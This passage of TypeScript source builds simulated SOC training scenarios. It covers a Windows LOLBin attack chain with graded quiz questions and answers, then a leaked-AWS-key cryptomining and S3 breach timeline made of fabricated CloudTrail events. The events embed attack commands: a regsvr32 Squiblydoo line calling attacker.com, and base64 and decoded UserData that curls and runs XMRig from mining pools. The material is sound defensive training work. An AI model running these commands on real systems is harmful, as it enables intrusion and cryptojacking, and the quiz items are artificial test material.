      "Detect LOLBin chain execution: suspicious parent-child process relationships",
      "Identify persistence via BITS jobs (survive reboots) and scheduled tasks (SYSTEM privileges)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-2 * MIN), phase: "Initial Access",              action: "Phishing email 'HR_Policy_Update.docm' delivered to s.patel (T1566.001)" },
      { ts: T(0),        phase: "Initial Access / Download",  action: "certutil.exe downloads malicious EXE from malicious-update.ru (T1105)" },
      { ts: T(4 * MIN),  phase: "Defense Evasion",            action: "regsvr32.exe Squiblydoo — remote COM scriptlet bypasses AppLocker (T1218.010)" },
      { ts: T(7 * MIN),  phase: "Execution",                  action: "mshta.exe loads stage-2 VBScript from attacker URL (T1218.005)" },
      { ts: T(10 * MIN), phase: "Discovery",                  action: "wmic.exe enumerates all running processes (T1057)" },
      { ts: T(13 * MIN), phase: "Persistence / Download",     action: "bitsadmin.exe BITS job downloads persistence binary — survives reboot (T1197)" },
      { ts: T(16 * MIN), phase: "Defense Evasion",            action: "rundll32.exe loads unsigned attacker DLL from C:\\Users\\Public (T1218.011)" },
      { ts: T(20 * MIN), phase: "Persistence",                action: "schtasks.exe creates SYSTEM-level task 'NexaCorpHealthCheck' — every 5 minutes (T1053.005)" },
    ],
    questions: [
      {
        id: "lol_q1_signed_binary",
        prompt: "Every executable in this chain ships with Windows and carries a valid Microsoft signature. Given that, what makes evt_lol_01_certutil malicious?",
        kind: "single",
        options: [
          { value: "flags_and_destination", label: "certutil ran -urlcache -split -f to pull an EXE from an external host over HTTP" },
          { value: "certutil_unsigned", label: "The certutil.exe image on this workstation was unsigned and failed its signature check" },
          { value: "hash_matches_payload", label: "certutil.exe's own SHA256 is identical to the SHA256 of the file it just downloaded" },
          { value: "wrong_folder", label: "certutil.exe was launched out of C:\\Users\\Public instead of its System32 location" },
        ],
        answer: "flags_and_destination",
        xp: 50,
        explanation:
          "A LOLBin is judged on behaviour, never on the file. certutil is a certificate utility; -urlcache -split -f turns it into a downloader, and the destination is an uncategorised .ru host — the command line and the network peer are the evidence. 'certutil_unsigned' contradicts the record and misses the lesson: the binary is the genuine signed OS component, which is precisely why it evaded download controls. 'hash_matches_payload' is impossible — one SHA256 identifies one file, and the event carries two distinct hashes, one for the certutil image and one for update.exe. 'wrong_folder' is contradicted by FolderPath, which reads C:\\Windows\\System32; a LOLBin runs from its normal home.",
      },
      {
        id: "lol_q2_squiblydoo",
        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
        kind: "single",
        options: [
          { value: "signed_host_interprets", label: "An allow-listed signed binary interprets the remote scriptlet, so no new EXE is started" },
          { value: "u_flag_unregisters", label: "The /u flag unregisters the DLL, which also strips it out of the AppLocker rule set" },
          { value: "sct_not_covered", label: "AppLocker never evaluates .sct files at all because it classifies them as image data" },
          { value: "http_is_exempt", label: "AppLocker only evaluates files on local disk, so anything fetched over HTTP is exempt" },
        ],
        answer: "signed_host_interprets",
        xp: 75,
        explanation:
          "This is Squiblydoo (T1218.010). AppLocker decides whether *a process image* may run; regsvr32.exe is a Microsoft binary that virtually every policy permits, and the attacker's code never becomes a process image — scrobj.dll fetches the scriptlet and executes it inside regsvr32. 'u_flag_unregisters' misreads the switch: /u with /i still invokes the scriptlet's unregister entry point, and AppLocker policy is machine configuration that regsvr32 cannot edit. 'sct_not_covered' is close to a real gap but wrong on mechanism — AppLocker does have script rules; they are bypassed because the scriptlet is never written to disk as a file for those rules to evaluate. 'http_is_exempt' invents an exemption; the location of the payload is irrelevant when the evaluated image is an approved one.",
      },
      {
        id: "lol_q3_parent_child",
        prompt: "Follow InitiatingProcessFileName and the parent PIDs across evt_lol_01 through evt_lol_07. Which reconstruction of the execution chain is supported by the records?",
        kind: "single",
        options: [
          { value: "regsvr_to_mshta_to_ps", label: "regsvr32 (5512) spawned mshta, whose PowerShell (6200) then parented wmic and bitsadmin" },
          { value: "cmd_parents_everything", label: "cmd.exe (4420) is the recorded direct parent of every process in the chain after certutil" },
          { value: "certutil_spawned_regsvr", label: "certutil (4440) spawned regsvr32 (5512), which is why the two share the same workstation" },
          { value: "schtasks_started_chain", label: "schtasks (7900) launched the earlier stages and then re-registered itself to run as SYSTEM" },
        ],
        answer: "regsvr_to_mshta_to_ps",
        xp: 100,
        explanation:
          "mshta's record names regsvr32.exe (PID 5512) as its initiating process, and its command line launches hidden PowerShell; wmic, bitsadmin, rundll32 and schtasks all then record powershell.exe PID 6200 as initiator. That is the chain. 'cmd_parents_everything' holds only for the first two steps — and even there they are two different cmd PIDs (4420 and 5500); from wmic onward the initiator is PowerShell, not cmd. 'certutil_spawned_regsvr' asserts a link the data denies: regsvr32's parent PID is 5500, not certutil's 4440, and sharing a host is not a parent-child relationship. 'schtasks_started_chain' is chronologically impossible — schtasks runs at T+20, twenty minutes after certutil, and a process cannot parent events that happened before it existed.",
      },
      {
        id: "lol_q4_persistence",
        prompt: "Select the TWO events that give the attacker execution surviving a reboot of WS-HR-1133, and be able to say why the others do not.",
        kind: "multi",
        options: [
          { value: "bits_job", label: "The BITS job NexaCorpUpdate resumes its transfer automatically after the machine restarts" },
          { value: "schtask_system", label: "The task NexaCorpHealthCheck re-runs the dropped binary every five minutes under the logged-on user" },
          { value: "rundll32_dllmain", label: "rundll32 loading evil.dll from C:\\Users\\Public keeps that DLL resident on the host" },
          { value: "wmic_enumeration", label: "wmic process list brief registers a permanent WMI event consumer on the workstation" },
        ],
        answer: ["bits_job", "schtask_system"],
        xp: 75,
        explanation:
          "BITS jobs are queued in a service that the OS restarts and resumes after reboot (T1197), and a scheduled task is re-registered from disk at boot — here running as SYSTEM every five minutes (T1053.005). Together they give both delivery and execution that outlive a restart. 'rundll32_dllmain' is defence evasion, not persistence: the DLL is loaded into a process, and when that process or the machine dies the execution dies with it — the file remaining on disk is storage, not a trigger. 'wmic_enumeration' confuses two very different wmic uses: process list brief is a read-only discovery query, whereas a permanent WMI subscription requires creating filter and consumer objects under root\\subscription, which appears nowhere in these logs.",
      },
    ],
  };
}

// =========================================================================
// Scenario 10: Cloud Credential Leak → Cryptomining + Data Breach
// =========================================================================

export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-2026"): ScenarioBundle {
  const B = new Date("2026-06-08T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attackerIp = "203.189.76.14";
  const accountId  = "247316892041";
  const iamUser    = "rocketstack-ci-deploy";
  const iamArn     = `arn:aws:iam::${accountId}:user/${iamUser}`;
  const backdoorUser = "svc-lambda-monitoring";
  const s3Bucket   = "rocketstack-prod-customer-data";

  const events: TelemetryEvent[] = [
    // ── T+0: GitHub Advanced Security detects leaked AWS key ─────────────────
    {
      id: "evt_cm_01_github_alert", ts: T(0),
      source: "threat_intel", vendor: "GitHub Advanced Security",
      event_type: "threat_intel_match",
      severity: "high", mitre_technique: "T1552.001", mitre_tactic: "TA0006",
      user_email: "a.levy@rocketstack.io",
      description: "GitHub Advanced Security detected an AWS access key committed to the public repo rocketstack-io/deploy-scripts by a.levy@rocketstack.io.",
      raw: {
        "event.provider": "GitHub Advanced Security",
        "event.action": "secret_scanning_alert_created",
        "event.outcome": "detected",
        "github.secret_scanning.token_type": "aws_access_key_id",
        "github.secret_scanning.secret": "AKIA247316892041LEAK",
        "github.secret_scanning.commit": "f3a8c2d9b8e1f4a67c3d2e1f",
        "github.secret_scanning.repo": "rocketstack-io/deploy-scripts",
        "github.secret_scanning.author": "a.levy@rocketstack.io",
        "github.secret_scanning.branch": "main",
        "github.secret_scanning.file_path": "scripts/deploy.sh",
        "github.secret_scanning.line_number": "14",
        "github.secret_scanning.resolution": "reported_to_provider",
        "github.secret_scanning.provider_notified": "Amazon Web Services",
        "github.secret_scanning.push_protection_bypassed": "false",
        "github.secret_scanning.alert_number": "42",
        "threat.indicator.type": "aws-access-key",
        "threat.indicator.provider": "GitHub Advanced Security",
        "threat.indicator.confidence": "High",
        "action_result": "detected",
      },
    },

    // ── T+2min: Attacker bot fires GetCallerIdentity — confirms creds valid ──
    {
      id: "evt_cm_02_getcaller", ts: T(2 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      severity: "high", mitre_technique: "T1078.004", mitre_tactic: "TA0001",
      src_ip: attackerIp,
      user_email: "a.levy@rocketstack.io",
      description: `GetCallerIdentity was called using the leaked access key from Singapore (${attackerIp}).`,
      raw: {
        "aws.cloudtrail.event_name": "GetCallerIdentity",
        "aws.cloudtrail.event_source": "sts.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": iamUser,
        "aws.cloudtrail.user_identity.arn": iamArn,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041LEAK",
        "aws.cloudtrail.request_id": "a1b2c3d4-0002-0001-abcd-ef0000000002",
        "aws.cloudtrail.error_code": null,
        "aws.cloudtrail.error_message": null,
        "aws.cloudtrail.response_elements": null,
        "event.outcome": "success",
        "event.action": "GetCallerIdentity",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.city_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "action_result": "allowed",
      },
    },

    // ── T+4min: Rapid-fire cloud discovery — automated recon ─────────────────
    {
      id: "evt_cm_03_discovery", ts: T(4 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      severity: "medium", mitre_technique: "T1580", mitre_tactic: "TA0007",
      src_ip: attackerIp,
      user_email: "a.levy@rocketstack.io",
      description: "The leaked key called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds, returning 12 S3 buckets and 9 Secrets Manager entries.",
      raw: {
        "aws.cloudtrail.event_name": "ListBuckets|DescribeInstances|ListSecrets|DescribeVpcs",
        "aws.cloudtrail.event_source": "s3.amazonaws.com|ec2.amazonaws.com|secretsmanager.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": iamUser,
        "aws.cloudtrail.user_identity.arn": iamArn,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041LEAK",
        "aws.cloudtrail.request_id": "a1b2c3d4-0004-0001-abcd-ef0000000004",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "CloudRecon",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "action_result": "allowed",
      },
    },

    // ── T+6min: RunInstances us-east-1 — 8x p3.8xlarge with XMRig UserData ──
    {
      id: "evt_cm_04_gpu_east", ts: T(6 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      severity: "critical", mitre_technique: "T1578.002", mitre_tactic: "TA0005",
      src_ip: attackerIp,
      user_email: "a.levy@rocketstack.io",
      description: "The leaked key called RunInstances in us-east-1, launching 8 p3.8xlarge GPU instances whose UserData script downloads and runs an XMRig miner pointed at pool.minexmr.com.",
      raw: {
        "aws.cloudtrail.event_name": "RunInstances",
        "aws.cloudtrail.event_source": "ec2.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": iamUser,
        "aws.cloudtrail.user_identity.arn": iamArn,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041LEAK",
        "aws.cloudtrail.request_parameters": "{\"instanceType\": \"p3.8xlarge\", \"maxCount\": 8, \"minCount\": 8, \"imageId\": \"ami-0abcdef1234567890\", \"userData\": \"IyEvYmluL2Jhc2gKY3VybCAtTCBodHRwczovL3Bvb2wubWluZXhtci5jb20veG1yaWcgLW8gL3RtcC94bXJpZyAmJiBjaG1vZCAreCAvdG1wL3htcmlnICYmIC90bXAveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbTo0NDQ0\"}",
        "aws.cloudtrail.request_parameters.instanceType": "p3.8xlarge",
        "aws.cloudtrail.request_parameters.maxCount": "8",
        "aws.cloudtrail.request_parameters.imageId": "ami-0abcdef1234567890",
        "aws.cloudtrail.request_parameters.userData.decoded_preview": "#!/bin/bash\ncurl -L https://pool.minexmr.com/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.minexmr.com:4444",
        "aws.cloudtrail.response_elements.instancesSet.items.0.instanceId": "i-0a1b2c3d4e5f60001",
        "aws.cloudtrail.request_id": "a1b2c3d4-0006-0001-abcd-ef0000000006",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "RunInstances",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "ec2.instance_type": "p3.8xlarge",
        "ec2.instance_count": "8",
        "ec2.mining_pool": "pool.minexmr.com:4444",
        "action_result": "allowed",
      },
    },

    // ── T+8min: RunInstances eu-west-1 — 6x p3.8xlarge, second region ────────
    {
      id: "evt_cm_05_gpu_eu", ts: T(8 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      severity: "critical", mitre_technique: "T1578.002", mitre_tactic: "TA0005",
      src_ip: attackerIp,
      user_email: "a.levy@rocketstack.io",
      description: "The same key called RunInstances in eu-west-1, launching 6 more p3.8xlarge GPU instances.",
      raw: {
        "aws.cloudtrail.event_name": "RunInstances",
        "aws.cloudtrail.event_source": "ec2.amazonaws.com",
        "aws.cloudtrail.aws_region": "eu-west-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": iamUser,
        "aws.cloudtrail.user_identity.arn": iamArn,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041LEAK",
        "aws.cloudtrail.request_parameters": "{\"instanceType\": \"p3.8xlarge\", \"maxCount\": 6, \"minCount\": 6, \"imageId\": \"ami-0abcdef1234567890\", \"userData\": \"IyEvYmluL2Jhc2gKY3VybCAtTCBodHRwczovL3htci5wb29sLm1pbmVyZ2F0ZS5jb20veG1yaWcgLW8gL3RtcC94bXJpZyAmJiBjaG1vZCAreCAvdG1wL3htcmlnICYmIC90bXAveG1yaWcgLW8geG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NDQ0\"}",
        "aws.cloudtrail.request_parameters.instanceType": "p3.8xlarge",
        "aws.cloudtrail.request_parameters.maxCount": "6",
        "aws.cloudtrail.request_parameters.imageId": "ami-0abcdef1234567890",
        "aws.cloudtrail.request_parameters.userData.decoded_preview": "#!/bin/bash\ncurl -L https://xmr.pool.minergate.com/xmrig -o /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o xmr.pool.minergate.com:4444",
        "aws.cloudtrail.response_elements.instancesSet.items.0.instanceId": "i-0a1b2c3d4e5f60002",
        "aws.cloudtrail.request_id": "a1b2c3d4-0008-0001-abcd-ef0000000008",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "RunInstances",
        "cloud.provider": "aws",
        "cloud.region": "eu-west-1",
        "cloud.account.id": accountId,
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "ec2.instance_type": "p3.8xlarge",
        "ec2.instance_count": "6",
        "ec2.mining_pool": "xmr.pool.minergate.com:4444",
        "action_result": "allowed",
      },
    },

    // ── T+10min: CreateUser — attacker backdoor IAM account ───────────────────
    {
      id: "evt_cm_06_iam_user", ts: T(10 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "account_create",
      severity: "critical", mitre_technique: "T1136.003", mitre_tactic: "TA0003",
      src_ip: attackerIp,
      user_email: "a.levy@rocketstack.io",
      description: `CreateUser was called to create a new IAM user, svc-lambda-monitoring, from ${attackerIp}.`,
      raw: {
        "aws.cloudtrail.event_name": "CreateUser",
        "aws.cloudtrail.event_source": "iam.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": iamUser,
        "aws.cloudtrail.user_identity.arn": iamArn,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041LEAK",
        "aws.cloudtrail.request_parameters": `{\"userName\": \"${backdoorUser}\", \"path\": \"/\"}`,
        "aws.cloudtrail.request_parameters.userName": backdoorUser,
        "aws.cloudtrail.response_elements.user.userId": "AIDA247316892041BACK",
        "aws.cloudtrail.response_elements.user.arn": `arn:aws:iam::${accountId}:user/${backdoorUser}`,
        "aws.cloudtrail.response_elements.user.createDate": T(10 * MIN),
        "aws.cloudtrail.request_id": "a1b2c3d4-0010-0001-abcd-ef0000000010",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "CreateUser",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "iam.new_user": backdoorUser,
        "action_result": "allowed",
      },
    },

    // ── T+13min: AttachUserPolicy — AdministratorAccess on backdoor user ──────
    {
      id: "evt_cm_07_iam_admin", ts: T(13 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_role_change",
      severity: "critical", mitre_technique: "T1098.001", mitre_tactic: "TA0003",
      src_ip: attackerIp,
      user_email: "a.levy@rocketstack.io",
      description: "AttachUserPolicy attached the AWS managed policy AdministratorAccess to svc-lambda-monitoring — three minutes after the account was created.",
      raw: {
        "aws.cloudtrail.event_name": "AttachUserPolicy",
        "aws.cloudtrail.event_source": "iam.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": iamUser,
        "aws.cloudtrail.user_identity.arn": iamArn,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041LEAK",
        "aws.cloudtrail.request_parameters": `{\"userName\": \"${backdoorUser}\", \"policyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"}`,
        "aws.cloudtrail.request_parameters.userName": backdoorUser,
        "aws.cloudtrail.request_parameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
        "aws.cloudtrail.request_id": "a1b2c3d4-0013-0001-abcd-ef0000000013",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "AttachUserPolicy",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "iam.target_user": backdoorUser,
        "iam.policy_attached": "AdministratorAccess",
        "iam.policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess",
        "iam.policy_type": "AWS Managed",
        "action_result": "allowed",
      },
    },

    // ── T+16min: GuardDuty CryptoCurrency:EC2/BitcoinTool.B!DNS ─────────────
    {
      id: "evt_cm_08_guardduty", ts: T(16 * MIN),
      source: "ueba", vendor: "AWS GuardDuty",
      event_type: "ueba_anomaly",
      severity: "critical", mitre_technique: "T1496", mitre_tactic: "TA0040",
      dst_ip: attackerIp,
      description: "AWS GuardDuty raised CryptoCurrency:EC2/BitcoinTool.B!DNS (severity 7.8) — 14 EC2 instances querying cryptocurrency mining pool domains at 847 DNS requests per minute.",
      raw: {
        "event.provider": "AWS GuardDuty",
        "event.action": "GuardDutyFinding",
        "event.outcome": "detected",
        "aws.guardduty.finding.type": "CryptoCurrency:EC2/BitcoinTool.B!DNS",
        "aws.guardduty.finding.severity": 7.8,
        "aws.guardduty.finding.title": "EC2 instance querying a cryptocurrency-related domain",
        "aws.guardduty.finding.description": "14 EC2 instances in your AWS account are querying a domain name associated with cryptocurrency-related activity. This activity may indicate that your credentials are compromised.",
        "aws.guardduty.finding.id": "gd-a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "aws.guardduty.finding.resource.instanceDetails.instanceId": "i-0a1b2c3d4e5f6a7b8",
        "aws.guardduty.finding.resource.instanceDetails.instanceType": "p3.8xlarge",
        "aws.guardduty.finding.resource.resourceType": "Instance",
        "aws.guardduty.finding.action.dnsRequestAction.domain": "pool.minexmr.com",
        "aws.guardduty.finding.action.dnsRequestAction.protocol": "UDP",
        "aws.guardduty.finding.action.dnsRequestAction.blocked": false,
        "aws.guardduty.finding.service.additionalInfo.domain2": "xmr.pool.minergate.com",
        "aws.guardduty.finding.service.count": 847,
        "aws.guardduty.finding.service.detector_id": "det-a1b2c3d4e5f6a1b2c3d4",
        "aws.guardduty.finding.accountId": accountId,
        "aws.guardduty.finding.region": "us-east-1",
        "aws.guardduty.finding.count": 14,
        "aws.guardduty.finding.created_at": T(16 * MIN),
        "aws.guardduty.finding.category": "CRYPTOCURRENCY",
        "cloud.provider": "aws",
        "cloud.account.id": accountId,
        "mining.pool.primary": "pool.minexmr.com",
        "mining.pool.secondary": "xmr.pool.minergate.com",
        "mining.instances_affected": "14",
        "action_result": "detected",
      },
    },

    // ── T+20min: AWS Cost Anomaly Detection — $47k in 6 hours ────────────────
    {
      id: "evt_cm_09_billing", ts: T(20 * MIN),
      source: "ueba", vendor: "AWS Cost Anomaly Detection",
      event_type: "ueba_anomaly",
      severity: "critical", mitre_technique: "T1496", mitre_tactic: "TA0040",
      description: "AWS Cost Anomaly Detection flagged a $47,320 spend spike over 6 hours against an $800/day baseline, attributed to p3.8xlarge usage in us-east-1 and eu-west-1.",
      raw: {
        "event.provider": "AWS Cost Anomaly Detection",
        "event.action": "AnomalyDetected",
        "event.outcome": "detected",
        "aws.cost_anomaly.monitor_name": "EC2 Spend Monitor",
        "aws.cost_anomaly.monitor_arn": `arn:aws:ce::${accountId}:anomalymonitor/ami-ec2-spend`,
        "aws.cost_anomaly.anomaly_id": "anomaly-a1b2c3d4-e5f6-0009",
        "aws.cost_anomaly.total_impact": "47320.00",
        "aws.cost_anomaly.anomalous_spend": "47320.00",
        "aws.cost_anomaly.baseline_spend": "800.00",
        "aws.cost_anomaly.expected_spend": "800.00",
        "aws.cost_anomaly.detection_method": "CONTEXTUAL",
        "aws.cost_anomaly.root_cause.service": "Amazon EC2",
        "aws.cost_anomaly.root_cause.region": "us-east-1",
        "aws.cost_anomaly.root_cause.instance_type": "p3.8xlarge",
        "aws.cost_anomaly.root_cause.usage_type": "BoxUsage:p3.8xlarge",
        "aws.cost_anomaly.sns_topic": "arn:aws:sns:us-east-1:247316892041:billing-alerts",
        "aws.cost_anomaly.notification_email": "billing-alerts@rocketstack.io",
        "aws.cost_anomaly.time_period.start": T(0),
        "aws.cost_anomaly.time_period.end": T(20 * MIN),
        "ueba.risk_score": 98,
        "cloud.provider": "aws",
        "cloud.account.id": accountId,
        "action_result": "alerted",
      },
    },

    // ── T+22min: PutBucketPolicy — makes prod S3 bucket public ───────────────
    {
      id: "evt_cm_10_bucket_public", ts: T(22 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      severity: "critical", mitre_technique: "T1530", mitre_tactic: "TA0009",
      src_ip: attackerIp,
      description: `PutBucketPolicy, called by svc-lambda-monitoring, changed rocketstack-prod-customer-data's policy to allow public read access from any principal.`,
      raw: {
        "aws.cloudtrail.event_name": "PutBucketPolicy",
        "aws.cloudtrail.event_source": "s3.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
        "aws.cloudtrail.user_identity.type": "IAMUser",
        "aws.cloudtrail.user_identity.user_name": backdoorUser,
        "aws.cloudtrail.user_identity.arn": `arn:aws:iam::${accountId}:user/${backdoorUser}`,
        "aws.cloudtrail.user_identity.account_id": accountId,
        "aws.cloudtrail.user_identity.access_key_id": "AKIA247316892041BACK",
        "aws.cloudtrail.request_parameters": `{\"bucketName\": \"${s3Bucket}\", \"AllowPublicRead\": true, \"Effect\": \"Allow\", \"Principal\": \"*\", \"Action\": \"s3:GetObject\"}`,
        "aws.cloudtrail.request_parameters.bucketName": s3Bucket,
        "aws.cloudtrail.request_parameters.AllowPublicRead": true,
        "aws.cloudtrail.request_parameters.policy.Principal": "*",
        "aws.cloudtrail.request_parameters.policy.Action": "s3:GetObject",
        "aws.cloudtrail.request_parameters.policy.Effect": "Allow",
        "aws.cloudtrail.request_id": "a1b2c3d4-0022-0001-abcd-ef0000000022",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "PutBucketPolicy",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "s3.bucket": s3Bucket,
        "s3.public_access_enabled": true,
        "s3.previous_policy": "private",
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "action_result": "allowed",
      },
    },

    // ── T+24min: S3 server access logs — 4.7GB exfiltration via public access ─
    {
      id: "evt_cm_11_s3_exfil", ts: T(24 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_storage_access",
      severity: "critical", mitre_technique: "T1530", mitre_tactic: "TA0009",
      src_ip: attackerIp,
      description: `S3 access logs show 12,847 objects (4.7GB) downloaded from rocketstack-prod-customer-data by an anonymous requester at ${attackerIp}.`,
      network: { bytes_out: 4_718_592_000, bytes_in: 0 },
      raw: {
        "aws.cloudtrail.event_name": "GetObject",
        "aws.cloudtrail.event_source": "s3.amazonaws.com",
        "aws.cloudtrail.aws_region": "us-east-1",
        "aws.cloudtrail.source_ip_address": attackerIp,
        "aws.cloudtrail.user_agent": "python-requests/2.31.0",
        "aws.cloudtrail.user_identity.type": "Anonymous",
        "aws.cloudtrail.user_identity.arn": null,
        "aws.cloudtrail.user_identity.account_id": null,
        "aws.cloudtrail.request_parameters.bucketName": s3Bucket,
        "aws.cloudtrail.request_parameters.key": "customers/",
        "aws.cloudtrail.request_id": "a1b2c3d4-0024-0001-abcd-ef0000000024",
        "aws.cloudtrail.error_code": null,
        "event.outcome": "success",
        "event.action": "GetObject",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "s3.bucket": s3Bucket,
        "s3.bytes_transferred": "4718592000",
        "s3.access_method": "public_http",
        "s3.requester": "ANONYMOUS",
        "source.ip": attackerIp,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.location.lat": 1.3521,
        "GeoLocation.location.lon": 103.8198,
        "network.bytes_out": "4718592000",
        "action_result": "allowed",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",     value: attackerIp,                             reputation: "malicious",  tags: ["attacker-bot", "singapore", "credential-abuse"] },
    { type: "domain", value: "pool.minexmr.com",                     reputation: "malicious",  tags: ["monero-mining-pool", "xmrig", "cryptomining"] },
    { type: "domain", value: "xmr.pool.minergate.com",               reputation: "malicious",  tags: ["monero-mining-pool", "cryptomining"] },
    { type: "user",   value: backdoorUser,                           reputation: "malicious",  tags: ["iam-principal", "aws"] },
    { type: "user",   value: iamUser,                                reputation: "suspicious", tags: ["compromised-iam-user", "leaked-credentials"] },
    { type: "host",   value: s3Bucket,                               reputation: "suspicious", tags: ["exfiltrated-bucket", "data-breach", "made-public"] },
    { type: "url",    value: "https://github.com/rocketstack-io/deploy-scripts/commit/f3a8c2d9b8e1f4a67c3d2e1f", reputation: "suspicious", tags: ["credential-leak-source", "github-commit"] },
    { type: "email",  value: "a.levy@rocketstack.io",                reputation: "suspicious", tags: ["developer", "accidental-leak", "not-malicious"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Credential Exposure",       action: "a.levy commits AWS key AKIA247316892041LEAK to public GitHub repo — secret scanning detects it and reports it to AWS after 3 minutes" },
